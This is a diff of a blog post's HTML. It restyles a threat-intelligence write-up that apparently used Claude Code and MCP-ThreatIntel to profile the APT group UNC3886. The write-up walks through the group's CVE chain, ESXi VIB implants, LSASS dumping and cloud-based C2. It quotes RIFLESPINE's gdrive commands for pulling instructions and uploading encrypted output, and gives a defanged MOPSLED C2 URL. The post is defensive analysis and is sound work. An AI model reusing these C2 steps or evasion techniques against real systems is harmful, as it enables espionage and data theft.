@@ -99,7 +99,7 @@
         }
 
         .post-body {
-            font-family: var(--font-mono);
+            font-family: var(--font-ui);
             font-size: 13.5px;
             color: var(--text-muted);
             line-height: 1.9;
@@ -126,6 +126,7 @@
 
         .post-body p {
             margin-bottom: 18px;
+            text-align: justify;
         }
 
         .post-body strong {
@@ -217,19 +218,28 @@
             color: var(--text-dim);
         }
 
-        .step-label {
-            font-family: var(--font-ui);
-            font-size: 9px;
-            font-weight: 700;
-            letter-spacing: 0.1em;
-            color: var(--blue);
-            background: rgba(90,173,255,0.08);
-            border: 1px solid rgba(90,173,255,0.2);
-            padding: 2px 8px;
-            border-radius: 2px;
-            display: inline-block;
-            margin-bottom: 8px;
+        .post-body table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            font-size: 13px;
         }
+
+        .post-body table th {
+            background: #000080;
+            color: #ffffff;
+            padding: 8px 12px;
+            text-align: left;
+            font-weight: bold;
+        }
+
+        .post-body table td {
+            padding: 8px 12px;
+            border-bottom: 1px solid #808080;
+        }
+
+        .post-body table tr:nth-child(odd) td  { background: #ffffff; }
+        .post-body table tr:nth-child(even) td { background: #f0f0ec; }
     </style>
 </head>
 <body>
@@ -250,149 +260,355 @@
 
         <div class="post-body">
 
-            <p>As someone with a keen interest in threat hunting and threat intelligence, I've always been curious about how AI can deepen the quality of intelligence gathering — not just as a search assistant, but as an active analyst. In this post, I'll be using <strong>Claude Code</strong> with <strong>MCP-ThreatIntel</strong> integration to analyse <em>UNC3886</em>, a highly sophisticated Chinese-linked APT group, and demonstrate what AI-assisted threat intelligence analysis actually looks like in practice.</p>
+            <p>Being deeply interested in threat hunt and threat intel, I was always curious about how we can leverage AI solutions to deepen the process of intelligence gathering. With the hype now about genAI, and Anthropic's new model "Mythos", I hope to explore more about Claude Code's capabilities in day to day intelligence work. In this blog post, I will be utilising <strong>MCP-ThreatIntel</strong> and open source intelligence to analyse APT group, <strong>UNC3886</strong>.</p>
 
-            <div class="callout">
-                <strong>TLDR:</strong> UNC3886 is a stealthy, hypervisor-level APT that weaponises virtualisation blind spots. We'll break down their full attack chain using AI-assisted threat intel via MCP.
-            </div>
+
 
             <h2>Understanding What MCP Is</h2>
 
-            <p>Before we dive into the threat actor, it's worth understanding the tooling. <strong>Model Context Protocol (MCP)</strong> is a framework that allows AI systems to directly interact with external tools, APIs, and datasets — instead of relying on manual copy-paste workflows.</p>
+            <p>The <strong>Model Context Protocol (MCP)</strong> is a framework that allows AI systems to directly interact with external tools, APIs, and datasets instead of relying on copy-paste workflows.</p>
 
-            <p>The traditional workflow for a threat analyst looks something like this: open a browser, search VirusTotal, copy the results, paste into your LLM, ask a question, go back and search another feed, repeat. It's tedious, fragmented, and slow.</p>
+            <p><strong>Before MCP:</strong></p>
+            <ul>
+                <li>You search for threat intel manually</li>
+                <li>Copy results into ChatGPT/Claude</li>
+                <li>Ask for analysis</li>
+                <li>Go back and forth</li>
+            </ul>
 
-            <p>With MCP, that entire loop collapses. The AI queries threat feeds directly, aggregates the data, and produces actionable analysis — all within a single prompt.</p>
+            <p><strong>After MCP:</strong></p>
+            <ul>
+                <li>The AI queries threat feeds directly</li>
+                <li>Correlates data automatically</li>
+                <li>Produces actionable insights seamlessly</li>
+            </ul>
 
             <h2>Using MCP-ThreatIntel by Pete-Builds</h2>
 
-            <p><strong>MCP-ThreatIntel</strong> is an open-source project that integrates cyber threat intelligence directly into AI workflows, allowing an AI assistant to behave like a real threat analyst. Here's how the workflow is structured:</p>
+            <p>As someone that is just hopping into the scene of CTI, there's various reputable vendors to check/cross ref IOCs, CVEs, etc. Recently, I came across a project that integrate CTI directly into AI workflows using MCP. In simple terms, it allows an AI assistant to behave like a real threat analyst.</p>
 
+            <p>The workflow:</p>
             <ol>
-                <li><strong>LLM Tool Invocation</strong> — The LLM identifies intent and calls a registered MCP tool</li>
-                <li><strong>MCP Server Dispatch</strong> — The MCP server receives the request and maps it to a specific handler</li>
-                <li><strong>Data Retrieval Layer</strong> — Queries a local SQLite cache and external APIs (VirusTotal, OTX, etc.)</li>
-                <li><strong>Aggregation &amp; Structuring</strong> — Results are normalised and returned as structured JSON</li>
-                <li><strong>LLM Reasoning Layer</strong> — The LLM generates contextual analysis from the structured output</li>
+                <li><strong>LLM &rarr; Tool Invocation (via MCP)</strong> — The model identifies intent (e.g. IOC lookup) and calls a registered MCP tool.</li>
+                <li><strong>MCP Server &rarr; Function Dispatch</strong> — The MCP-ThreatIntel server receives the request &amp; maps it to a specific handler (e.g. lookup_ip, lookup_cve).</li>
+                <li><strong>Data Retrieval Layer</strong> — Queries local cache (SQLite) for pre-ingested feeds. Optionally calls external APIs (OTX, AbuseIPDB, HIBP, etc.). Performs normalization + enrichment.</li>
+                <li><strong>Aggregation &amp; Structuring</strong> — Results are correlated, deduplicated, and returned in structured JSON (reputation, tags, related indicators, CVEs, etc.)</li>
+                <li><strong>LLM Reasoning Layer</strong> — The LLM consumes the structured output and generates contextual analysis (risk, attribution hints, recommended actions)</li>
             </ol>
 
             <h2>Using MCP In Claude Code</h2>
 
-            <p>With MCP integrated into <strong>Claude Code</strong>, you can prompt it to generate a full threat intelligence report — with data aggregated from intelligence vendors via APIs and open source blog posts — without ever leaving your terminal.</p>
+            <p>Upon setting up the integration of MCP within Claude Code, we can prompt it to create a threat intelligence report, with the information aggregated from intelligence vendors via APIs and open source blog posts.</p>
 
             <img src="../images/post2/image1.png" alt="Claude Code MCP threat intel query">
 
-            <p>The result is a seamless analyst experience: ask a question, get a structured, sourced answer. No tab-switching. No manual correlation. This is the foundation for what we'll do next — querying UNC3886.</p>
 
+            <h2>Who is UNC3886</h2>
+
+            <p>An APT group that is widely suspected to be linked to Chinese-linked cyber espionage group, <strong>UNC3886</strong> was first detected in 2021-2022 by Mandiant. A short synopsis, UNC3886 attempts are known to be persistent with the intention of intelligence gathering and long term spying.</p>
+
+            <p>In the compiled threat intelligence report from Claude Code analyst:</p>
             <img src="../images/post2/image4.png" alt="Compiled threat intel report output in Claude Code">
 
-            <h2>Who is UNC3886?</h2>
-
-            <p><strong>UNC3886</strong> is a suspected Chinese-linked APT group first detected by Mandiant in 2021–2022. Unlike noisier threat actors that rely on phishing or commodity malware, UNC3886 operates with surgical precision — targeting network edge devices and virtualisation infrastructure to maintain persistent, long-term access with minimal detection footprint.</p>
-
-            <p>Their tradecraft is particularly notable for two reasons: they exploit <em>hypervisor-level blind spots</em> that most EDR solutions simply don't cover, and they abuse trusted third-party services (GitHub, Google Drive) for command-and-control to blend into normal enterprise traffic.</p>
-
-            <h2>Key Attack Chain</h2>
+            <h2>Key Attack Chains (Overview)</h2>
 
             <img src="../images/post2/image7.png" alt="UNC3886 attack chain overview">
 
             <h3>Step 1 — Initial Foothold on Network Edge Router</h3>
 
-            <p>UNC3886 gained initial access by exploiting <strong>CVE-2022-42475</strong>, a heap buffer overflow vulnerability in <strong>Fortinet FortiOS SSL-VPN</strong>. This is a pre-authentication RCE on perimeter devices — meaning they're in before any credential is involved.</p>
+            <p>For initial foothold, the APT group targeted network edge devices. They utilised <strong>CVE-2022-42475</strong>, a Fortinet FortiOS SSL-VPN vulnerability (heap buffer overflow) that gave them unauthenticated remote code execution on the perimeter.</p>
 
-            <p>Targeting the network edge is a deliberate choice. Perimeter devices are frequently excluded from EDR coverage, have limited logging visibility, and are trusted implicitly by the rest of the network.</p>
+            <p>According to Fortiguard (<a href="https://www.fortiguard.com/psirt/FG-IR-22-398" target="_blank">https://www.fortiguard.com/psirt/FG-IR-22-398</a>), these are the common IOCs and artifacts leftover on the target:</p>
 
             <img src="../images/post2/image6.png" alt="CVE-2022-42475 FortiGuard IOCs and artifacts">
+
+            <p>Fortinet themselves (<a href="https://www.fortinet.com/blog/psirt-blogs/analysis-of-fg-ir-22-398-fortios-heap-based-buffer-overflow-in-sslvpnd" target="_blank">https://www.fortinet.com/blog/psirt-blogs/analysis-of-fg-ir-22-398-fortios-heap-based-buffer-overflow-in-sslvpnd</a>) have commenced on an incident analysis, and confirmed the following common telltales:</p>
+
             <img src="../images/post2/image2.png" alt="CVE-2022-42475 incident analysis telltales">
 
             <h3>Step 2 — Targeting vCenter Server</h3>
 
-            <p>Once inside the network, the group pivoted to <strong>VMware vCenter Server</strong> using two CVEs in combination:</p>
+            <p>To understand this portion, we first have to know what vCenter is. vCenter Server is a centralised management utility by VMware that is mainly used to manage VMs, multiple ESXi hosts (physical hardware, bare-metal servers, dedicated to running many VMs simultaneously).</p>
 
-            <ul>
-                <li><strong>CVE-2023-34048</strong> — An out-of-bounds write in vCenter's DCERPC protocol, enabling unauthenticated remote code execution on the management plane</li>
-                <li><strong>CVE-2022-22948</strong> — Incorrect file permissions on the vCenter appliance, allowing an attacker to read sensitive files including credential stores</li>
-            </ul>
+            <p>Now, once the attackers are inside the network, they targeted vCenter with 2 particular CVEs:</p>
 
-            <p>Compromising vCenter is a force multiplier. A single vCenter instance typically manages dozens to hundreds of ESXi hosts — taking it gives the attacker keys to the entire virtualised estate.</p>
+            <table>
+                <thead>
+                    <tr>
+                        <th>CVE</th>
+                        <th>What it did</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><code>CVE-2023-34048</code></td>
+                        <td>Out-of-bounds write vulnerability in vCenter's DCERPC protocol &mdash; gave full Remote Code Execution on vCenter. This is how they owned the vCenter server itself</td>
+                    </tr>
+                    <tr>
+                        <td><code>CVE-2022-22948</code></td>
+                        <td>Incorrect file permissions in vCenter that allowed credential extraction directly from the vCenter database</td>
+                    </tr>
+                </tbody>
+            </table>
 
             <h3>Step 3 — Harvesting vpxuser Credentials</h3>
 
-            <p>vCenter Server ships with three built-in service accounts: <code>root</code>, <code>dcui</code> (direct console), and <code>vpxuser</code> (the vCenter administration account used to authenticate to every ESXi host it manages).</p>
+            <p>VMware vCenter Server is commonly enabled with 3 accounts &mdash; <code>root</code>, <code>dcui</code> (required or direct console service isolation, non-removable), and <code>vpxuser</code> (required for administration by vCenter Server).</p>
 
-            <p>UNC3886 extracted <strong>cleartext <code>vpxuser</code> credentials</strong> directly from the vCenter database. With these credentials, they could authenticate to every ESXi host under that vCenter instance — not to guest VMs directly, but to the hypervisor layer itself.</p>
+            <p><em>(Snippet taken from VMware vSphere Official Documentation: <a href="https://www.vmware.com/docs/default-accounts-in-vmware-vsphere" target="_blank">https://www.vmware.com/docs/default-accounts-in-vmware-vsphere</a>)</em></p>
 
-            <blockquote>This is a critical distinction: hypervisor-level access doesn't automatically mean guest VM access — but it is the prerequisite for the next step.</blockquote>
+            <img src="../images/post2/image9.png" alt="VMware default accounts in vSphere documentation">
 
-            <img src="../images/post2/image9.png" alt="vpxuser credential extraction from vCenter database">
+            <p>The attackers managed to extract cleartext credentials of the <code>vpxuser</code> stored in the vCenter database, meaning that they can essentially authenticate to every ESXi host.</p>
+
+            <p>However, note that these credentials can allow them access to the ESXi host management layer, not the guest VMs themselves! With <code>vpxuser</code> credentials, attackers can turn VMs on/off, deploy VIBs, etc. Guest VMs are separate isolated environments running on top of the ESXi host, so just because we have the credentials to the hypervisor, it doesn't automatically mean we can execute commands inside the VMs running on it (they have their own OS, credentials, and file system).</p>
 
             <h3>Step 4 — Deploying Malicious VIB Implants for Persistence on ESXi Hosts</h3>
 
-            <p>To establish persistent access on the hypervisor, UNC3886 deployed malicious <strong>vSphere Installation Bundles (VIBs)</strong> — VMware's native software packaging format. Because VIBs are installed at the hypervisor level, they survive guest VM reboots and are invisible to any endpoint security running inside the VMs.</p>
+            <p>Once inside the ESXi hosts (hypervisor layer), the APT group installed malicious VIBs (vSphere Installation Bundles) to maintain persistence. According to intel sources online, the 2 VIBs heavily utilised were <strong>VIRTUALPITA</strong> and <strong>VIRTUALPIE</strong>.</p>
 
-            <p>Two custom implants were deployed:</p>
-
-            <ul>
-                <li><strong>VIRTUALPITA</strong> — A 64-bit passive backdoor that creates hardcoded port listeners on the ESXi host. It masquerades as legitimate VMware services and disables command history logging to cover its tracks.</li>
-                <li><strong>VIRTUALPIE</strong> — A lightweight Python backdoor that spawns IPv6 listeners with arbitrary command execution, file transfer, and reverse shell capabilities. Communications are encrypted using a custom RC4-based protocol.</li>
-            </ul>
+            <p><em>(Photo by: <a href="https://cloud.google.com/blog/topics/threat-intelligence/esxi-hypervisors-malware-persistence" target="_blank">https://cloud.google.com/blog/topics/threat-intelligence/esxi-hypervisors-malware-persistence</a>)</em></p>
 
             <img src="../images/post2/image8.png" alt="VIRTUALPITA and VIRTUALPIE VIB implants on ESXi">
 
-            <h3>Step 5 — Exploiting Guest VMs via CVE-2023-20867</h3>
-
-            <p>With persistent hypervisor access established, UNC3886 leveraged <strong>CVE-2023-20867</strong> — a VMware Tools vulnerability — to execute privileged operations on guest VMs <em>without authentication</em>.</p>
-
-            <p>The requirements for this exploit are: privileged access to the ESXi host (already achieved via VIRTUALPITA/VIRTUALPIE) and VMware Tools installed on the target guest VM (the default configuration for most enterprise deployments).</p>
-
-            <blockquote>The guest VM has no visibility into what the hypervisor layer is doing. There are no logs, no alerts, no indicators — from the VM's perspective, nothing happened.</blockquote>
-
-            <h3>Step 6 — Data Harvesting &amp; Lateral Movement</h3>
-
-            <p>With guest VM access now established, the final phase involved credential harvesting and lateral movement across the environment:</p>
-
+            <p><strong>VIRTUALPITA</strong></p>
             <ul>
-                <li>Dumped credentials from <strong>LSASS memory</strong> via <code>Rundll32</code></li>
-                <li>Staged exfiltration files as compressed archives named with the pattern <code>ldapd&lt;keyword&gt;.2.gz</code></li>
-                <li>Deployed additional malware families for lateral movement and C2 (detailed in the next section)</li>
+                <li>a 64-bit passive backdoor that creates a listener on hardcoded port number on VMware ESXi server</li>
+                <li>Often utilises VMware service names and ports to masquerade as a legitimate service</li>
+                <li>Malware auto sets env variable HISTFILE to 0 to further hide activities</li>
             </ul>
+
+            <p><strong>VIRTUALPIE</strong></p>
+            <ul>
+                <li>a lightweight backdoor written in Python</li>
+                <li>Spawns demonised IPv6 listener on hardcoded port on VMware ESXi server</li>
+                <li>Supported arbitrary command line execution, file transfer, revshells, etc.</li>
+                <li>Communicates using a custom protocol, encrypted using RC4</li>
+            </ul>
+
+            <h3>Step 5 — Exploit to Reach Guest VMs</h3>
+
+            <p>Now, to get into the guest VM machines, UNC3886 utilised <strong>CVE-2023-20867</strong> to execute privileged guest operations, without the need to even authenticate into the guest VMs.</p>
+
+            <p>According to Mandiant, the only requirements needed to exploit this vulnerability are:</p>
+            <ol>
+                <li>The attacker has privileged account access (such as root or the vpxuser) to the ESXi host</li>
+                <li>The target guest machine has VMware Tools software installed</li>
+            </ol>
+
+            <p>The architecture will look something like this:</p>
+            <pre><code>ESXi Host &larr; VIBs installed here, survives reboots
+&#x2502;
+&#x251C;&#x2500;&#x2500; Guest VM 1 &larr; Access via CVE-2023-20867
+&#x251C;&#x2500;&#x2500; Guest VM 2 &larr; same
+&#x2514;&#x2500;&#x2500; Guest VM 3 &larr; same</code></pre>
+
+            <h3>Step 6 — &hellip; pwned &hellip;</h3>
+
+            <p>With access to the guest VMs now, attackers were able to run unauthenticated, privileged commands, and transferred files in/out freely. In an attempt to uncover / perform further lateral movements, UNC3886 utilised a few tactics to harvest more credentials:</p>
+            <ol>
+                <li><strong>LSASS memory dumping</strong> via Rundll32 on Windows guests to harvest more credentials</li>
+                <li><strong>File staging</strong>: credentials and data were archived (seen as <code>ldapd&lt;keyword&gt;.2.gz</code> files)</li>
+                <li>Using those harvested credentials via <strong>PITHOOK</strong> and <strong>LOOKOVER</strong> for further lateral movement across the broader network</li>
+            </ol>
 
             <img src="../images/post2/image3.png" alt="Lateral movement artifacts — PITHOOK and LOOKOVER">
             <img src="../images/post2/image5.png" alt="Lateral movement artifacts continued">
 
-            <h2>Defense Evasion — Why This Group Is So Hard to Catch</h2>
+            <h2>Defense Evasion, and What This Means for Defenders</h2>
 
-            <p>UNC3886's most sophisticated capability isn't a zero-day — it's their <em>operational security</em>. They chain legitimate tools with custom malware and route C2 traffic through trusted cloud services, making it extremely difficult to distinguish malicious traffic from normal enterprise activity.</p>
+            <p>According to Mandiant's discovery, UNC3886 was observed to utilise malware that primarily chains with trusted third party tools (i.e., Google Drive, GitHub) as C2 communications in an attempt to mask its tracks. In particular, <strong>MOPSLED</strong> and <strong>RIFLESPINE</strong> were utilised.</p>
 
             <h3>MOPSLED</h3>
 
-            <p><strong>MOPSLED</strong> is a backdoor that communicates over HTTP or a custom binary protocol. Linux variants were deployed on vCenter servers. To obtain its C2 address, MOPSLED issues an HTTP GET request to a <strong>GitHub</strong> repository, then decrypts the response using the <strong>ChaCha20</strong> stream cipher to retrieve the actual C2 endpoint.</p>
-
-            <p>From a defender's perspective, this looks like legitimate traffic to GitHub — a domain that is almost universally allowlisted in enterprise environments.</p>
+            <p>MOPSLED is a backdoor with capabilities to communicate over HTTP, or custom binary protocol to the attacker's C2 server. There is a Linux variant of this malware, called <strong>MOPSLED.LINUX</strong>. UNC3886 deployed this Linux variant on vCenter servers and a small number of compromised endpoints. It is used to communicate with a URL to retrieve an actual C2 address. Attackers sent HTTP GET requests to a known address, <code>https://cyberponke.github[.]io/*</code>. Upon retrieving the details, the response is decrypted using <strong>ChaCha20</strong> cipher to obtain the attacker's actual C2 address.</p>
 
             <h3>RIFLESPINE</h3>
 
-            <p><strong>RIFLESPINE</strong> takes a similar approach, but routes its entire C2 channel through <strong>Google Drive</strong>. The full command execution workflow:</p>
+            <p>RIFLESPINE is yet another backdoor malware leveraged by UNC3886. Instead of retrieving from GitHub like MOPSLED, it leverages <strong>Google Drive</strong> to execute commands and transfer files. This is done through an open source Google Drive CLI client, where a systemd service file was created and used to execute the malware. Upon installation for the first time, the malware collects system information and reads instructions to execute.</p>
 
+            <p>Mandiant wrote a writeup regarding the common steps/flow of RIFLESPINE, as shown below:</p>
             <ol>
-                <li>Execute <code>gdrive</code> to obtain target-specific files from a controlled Drive folder</li>
-                <li>Write the filename to a temporary file</li>
-                <li>Download matching files to <code>/tmp</code></li>
-                <li>Decrypt using <strong>CryptoPP AES-CBC</strong> with pre-shared keys</li>
-                <li>Read decrypted file for execution instructions</li>
-                <li>Execute commands and write output to a temporary file</li>
-                <li>Encrypt the response using the same AES keys</li>
-                <li>Upload the encrypted response back via <code>gdrive</code></li>
-                <li>Delay and repeat</li>
+                <li>Execute <code>gdrive</code> to obtain the file pertinent to the target endpoint with the following command:
+                    <pre><code>gdrive --refresh-token &lt;token&gt; list | grep "2@&lt;mac_address&gt;"</code></pre>
+                </li>
+                <li>Write the filename to a temporary file <code>/tmp/syslog&lt;random_number&gt;.rs</code>.</li>
+                <li>Download file to <code>/tmp</code> matching the filename with the following command:
+                    <pre><code>gdrive --refresh-token &lt;token&gt; download --path "/tmp" -f</code></pre>
+                </li>
+                <li>Decrypt file <code>/tmp/&lt;filename&gt;</code> to <code>/tmp/&lt;download_filename&gt;.de</code> using <strong>CryptoPP AES-CBC</strong> with key <code>libcrypt.so.2</code> and IV <code>libev.so.5</code>.</li>
+                <li>Read <code>/tmp/&lt;download_filename&gt;.de</code> line by line for instructions to execute.</li>
+                <li>After executing the instructions, write output to <code>/tmp/update&lt;random_number&gt;.tmp</code>.</li>
+                <li>Encrypt response from <code>/tmp/update&lt;random_number&gt;.tmp</code> to <code>/tmp/update&lt;random_number&gt;.tmp.en</code> using the same AES keys as decryption.</li>
+                <li>Upload encrypted response with the following command:
+                    <pre><code>gdrive --refresh-token &lt;token&gt; upload --name "/tmp/update&lt;random_number&gt;.tmp.en"</code></pre>
+                </li>
+                <li>Delay and repeat the previous steps.</li>
             </ol>
 
-            <p>Again — this is all Google Drive traffic. Encrypted, authenticated, and almost impossible to block without also breaking legitimate productivity tooling. This is the design intent: abuse trusted infrastructure to make detection cost-prohibitive.</p>
+            <hr style="border:none; border-top: 1px solid var(--border); margin: 44px 0;">
 
-            <hr style="border:none; border-top: 1px solid var(--border); margin: 40px 0;">
+            <h2>MITRE ATT&amp;CK Mapping (G1048)</h2>
 
-            <p>UNC3886 is a masterclass in operating below the detection threshold. By targeting the hypervisor layer — a blind spot for virtually all endpoint security products — and routing C2 through GitHub and Google Drive, they engineered an intrusion that could persist undetected for years in a typical enterprise environment.</p>
+            <p>75 confirmed techniques across 14 tactics. Highest-priority techniques for detection highlighted below.</p>
 
-            <p>What AI-assisted threat intelligence like MCP-ThreatIntel gives us is speed and coverage: the ability to correlate CVEs, malware families, TTPs, and IOCs across multiple feeds in seconds rather than hours. That matters, because against an adversary like UNC3886, the only way to win is to reduce your mean time to detect.</p>
+            <table style="font-size: 12px; line-height: 1.5;">
+                <thead>
+                    <tr>
+                        <th style="width: 92px;">Technique ID</th>
+                        <th style="width: 190px;">Name</th>
+                        <th>UNC3886 Usage</th>
+                        <th style="width: 68px; text-align:center;">Priority</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr><td colspan="4" style="background:#000080;color:#fff;font-weight:bold;font-size:10px;letter-spacing:0.12em;padding:5px 12px;">INITIAL ACCESS</td></tr>
+                    <tr>
+                        <td><code>T1190</code></td>
+                        <td>Exploit Public-Facing Application</td>
+                        <td>CVE-2022-42475 FortiOS SSL-VPN exploitation</td>
+                        <td style="text-align:center;"><span style="background:#cc0000;color:#fff;padding:1px 7px;font-size:10px;font-weight:bold;display:inline-block;">Critical</span></td>
+                    </tr>
+                    <tr>
+                        <td><code>T1078</code></td>
+                        <td>Valid Accounts</td>
+                        <td>Harvested credentials via PITHOOK/LOOKOVER reused for lateral movement</td>
+                        <td style="text-align:center;"><span style="background:#cc0000;color:#fff;padding:1px 7px;font-size:10px;font-weight:bold;display:inline-block;">Critical</span></td>
+                    </tr>
+
+                    <tr><td colspan="4" style="background:#000080;color:#fff;font-weight:bold;font-size:10px;letter-spacing:0.12em;padding:5px 12px;">EXECUTION</td></tr>
+                    <tr>
+                        <td><code>T1059.008</code></td>
+                        <td>Network Device CLI</td>
+                        <td>Accesses Junos OS CLI on Juniper devices for configuration and implant deployment</td>
+                        <td style="text-align:center;"><span style="background:#cc6600;color:#fff;padding:1px 7px;font-size:10px;font-weight:bold;display:inline-block;">High</span></td>
+                    </tr>
+                    <tr>
+                        <td><code>T1059.012</code></td>
+                        <td>Hypervisor CLI</td>
+                        <td>Uses esxcli for firewall rules, malware installation, and artifact removal</td>
+                        <td style="text-align:center;"><span style="background:#cc6600;color:#fff;padding:1px 7px;font-size:10px;font-weight:bold;display:inline-block;">High</span></td>
+                    </tr>
+                    <tr>
+                        <td><code>T1675</code></td>
+                        <td>ESXi Administration Command</td>
+                        <td>Uses vmtoolsd.exe to execute commands on guest VMs from compromised ESXi hypervisor</td>
+                        <td style="text-align:center;"><span style="background:#cc0000;color:#fff;padding:1px 7px;font-size:10px;font-weight:bold;display:inline-block;">Critical</span></td>
+                    </tr>
+
+                    <tr><td colspan="4" style="background:#000080;color:#fff;font-weight:bold;font-size:10px;letter-spacing:0.12em;padding:5px 12px;">PERSISTENCE</td></tr>
+                    <tr>
+                        <td><code>T1505.006</code></td>
+                        <td>vSphere Installation Bundles</td>
+                        <td>Deploys malicious VIBs with tampered XML signature bypass on ESXi hosts</td>
+                        <td style="text-align:center;"><span style="background:#cc0000;color:#fff;padding:1px 7px;font-size:10px;font-weight:bold;display:inline-block;">Critical</span></td>
+                    </tr>
+                    <tr>
+                        <td><code>T1554</code></td>
+                        <td>Compromise Host Software Binary</td>
+                        <td>Backdoors Junos OS daemons, FortiOS firmware, OpenSSH binaries</td>
+                        <td style="text-align:center;"><span style="background:#cc0000;color:#fff;padding:1px 7px;font-size:10px;font-weight:bold;display:inline-block;">Critical</span></td>
+                    </tr>
+                    <tr>
+                        <td><code>T1037.004</code></td>
+                        <td>RC Scripts</td>
+                        <td>Installs persistence scripts in /etc/rc.local.d/ on ESXi</td>
+                        <td style="text-align:center;"><span style="background:#cc6600;color:#fff;padding:1px 7px;font-size:10px;font-weight:bold;display:inline-block;">High</span></td>
+                    </tr>
+
+                    <tr><td colspan="4" style="background:#000080;color:#fff;font-weight:bold;font-size:10px;letter-spacing:0.12em;padding:5px 12px;">PRIVILEGE ESCALATION</td></tr>
+                    <tr>
+                        <td><code>T1055</code></td>
+                        <td>Process Injection</td>
+                        <td>CVE-2025-21590 exploited for code injection bypassing Veriexec on Junos OS</td>
+                        <td style="text-align:center;"><span style="background:#cc0000;color:#fff;padding:1px 7px;font-size:10px;font-weight:bold;display:inline-block;">Critical</span></td>
+                    </tr>
+                    <tr>
+                        <td><code>T1068</code></td>
+                        <td>Exploitation for Privilege Escalation</td>
+                        <td>CVE-2023-20867 used for privileged command execution on VMware guest VMs</td>
+                        <td style="text-align:center;"><span style="background:#cc0000;color:#fff;padding:1px 7px;font-size:10px;font-weight:bold;display:inline-block;">Critical</span></td>
+                    </tr>
+
+                    <tr><td colspan="4" style="background:#000080;color:#fff;font-weight:bold;font-size:10px;letter-spacing:0.12em;padding:5px 12px;">DEFENSE EVASION</td></tr>
+                    <tr>
+                        <td><code>T1014</code></td>
+                        <td>Rootkit</td>
+                        <td>REPTILE (kernel) and MEDUSA (LD_PRELOAD) for deep stealth persistence</td>
+                        <td style="text-align:center;"><span style="background:#cc0000;color:#fff;padding:1px 7px;font-size:10px;font-weight:bold;display:inline-block;">Critical</span></td>
+                    </tr>
+                    <tr>
+                        <td><code>T1070.007</code></td>
+                        <td>Clear Network Connection History</td>
+                        <td>Clears logs containing actor IP addresses</td>
+                        <td style="text-align:center;"><span style="background:#cc6600;color:#fff;padding:1px 7px;font-size:10px;font-weight:bold;display:inline-block;">High</span></td>
+                    </tr>
+                    <tr>
+                        <td><code>T1070.006</code></td>
+                        <td>Timestomp</td>
+                        <td>Timestomps ESXi artifacts before VIB installation</td>
+                        <td style="text-align:center;"><span style="background:#cc6600;color:#fff;padding:1px 7px;font-size:10px;font-weight:bold;display:inline-block;">High</span></td>
+                    </tr>
+                    <tr>
+                        <td><code>T1562.003</code></td>
+                        <td>Impair Command History Logging</td>
+                        <td>Clears HISTFILE; yum-versionlock freezes backdoored OpenSSH packages</td>
+                        <td style="text-align:center;"><span style="background:#cc6600;color:#fff;padding:1px 7px;font-size:10px;font-weight:bold;display:inline-block;">High</span></td>
+                    </tr>
+                    <tr>
+                        <td><code>T1681</code></td>
+                        <td>Search Threat Vendor Data</td>
+                        <td>Monitors published TI; replaces burned IOCs within ~1 week</td>
+                        <td style="text-align:center;"><span style="background:#cc6600;color:#fff;padding:1px 7px;font-size:10px;font-weight:bold;display:inline-block;">High</span></td>
+                    </tr>
+                    <tr>
+                        <td><code>T1036.004</code></td>
+                        <td>Masquerade Task or Service</td>
+                        <td>CASTLETAP named 'fgfm' to mimic legitimate FortiGate 'fgfmd' service</td>
+                        <td style="text-align:center;"><span style="background:#cc6600;color:#fff;padding:1px 7px;font-size:10px;font-weight:bold;display:inline-block;">High</span></td>
+                    </tr>
+
+                    <tr><td colspan="4" style="background:#000080;color:#fff;font-weight:bold;font-size:10px;letter-spacing:0.12em;padding:5px 12px;">CREDENTIAL ACCESS</td></tr>
+                    <tr>
+                        <td><code>T1040</code></td>
+                        <td>Network Sniffing</td>
+                        <td>LOOKOVER sniffs TACACS+ traffic; passive backdoor sniffing</td>
+                        <td style="text-align:center;"><span style="background:#cc6600;color:#fff;padding:1px 7px;font-size:10px;font-weight:bold;display:inline-block;">High</span></td>
+                    </tr>
+                    <tr>
+                        <td><code>T1003.001</code></td>
+                        <td>LSASS Memory</td>
+                        <td>MiniDump via Rundll32 for process memory and credential extraction on Windows guests</td>
+                        <td style="text-align:center;"><span style="background:#cc6600;color:#fff;padding:1px 7px;font-size:10px;font-weight:bold;display:inline-block;">High</span></td>
+                    </tr>
+
+                    <tr><td colspan="4" style="background:#000080;color:#fff;font-weight:bold;font-size:10px;letter-spacing:0.12em;padding:5px 12px;">COMMAND &amp; CONTROL</td></tr>
+                    <tr>
+                        <td><code>T1090.003</code></td>
+                        <td>Multi-hop Proxy</td>
+                        <td>ORB (Operational Relay Box) networks used to obscure true C2 origin</td>
+                        <td style="text-align:center;"><span style="background:#cc6600;color:#fff;padding:1px 7px;font-size:10px;font-weight:bold;display:inline-block;">High</span></td>
+                    </tr>
+                    <tr>
+                        <td><code>T1205.001</code></td>
+                        <td>Port Knocking</td>
+                        <td>CASTLETAP and TABLEFLIP activate dormant backdoors via ICMP magic packets</td>
+                        <td style="text-align:center;"><span style="background:#cc6600;color:#fff;padding:1px 7px;font-size:10px;font-weight:bold;display:inline-block;">High</span></td>
+                    </tr>
+                    <tr>
+                        <td><code>T1571</code></td>
+                        <td>Non-Standard Port</td>
+                        <td>TINYSHELL binds to TCP port 45678 by default</td>
+                        <td style="text-align:center;"><span style="background:#808000;color:#fff;padding:1px 7px;font-size:10px;font-weight:bold;display:inline-block;">Medium</span></td>
+                    </tr>
+                    <tr>
+                        <td><code>T1102</code></td>
+                        <td>Web Service (Cloud C2)</td>
+                        <td>RIFLESPINE uses Google Drive; dead-drop resolvers on GitHub Pages</td>
+                        <td style="text-align:center;"><span style="background:#cc0000;color:#fff;padding:1px 7px;font-size:10px;font-weight:bold;display:inline-block;">Critical</span></td>
+                    </tr>
+                </tbody>
+            </table>
 
         </div>
 
